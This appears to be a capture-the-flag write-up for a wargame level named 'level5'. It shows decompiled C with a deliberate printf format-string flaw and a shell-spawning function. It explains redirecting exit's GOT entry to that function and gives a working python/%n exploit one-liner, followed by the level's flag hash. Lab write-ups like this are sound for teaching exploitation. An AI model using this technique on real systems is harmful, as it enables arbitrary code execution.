```c
void o(void)
{
  system("/bin/sh");
  _exit(1);
}

void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);
  exit(1);
}

void main(void)
{
  n();
  return;
}
```

Here the idea is the same as writing to a variable, however with a twist: we'll instead write to a pointer !
Since a pointer is basically an int in disguise, we can change it's value with the printf exploit. Since we need to reach the function `o`, we can change the pointer of `exit` to make it point to `o`.

o = `0x080484a4` -> `134513828`
exit = `*0x8049838`

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' ; cat) | ./level5
                                        ^^^^^^^^^ o - 4
```
`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
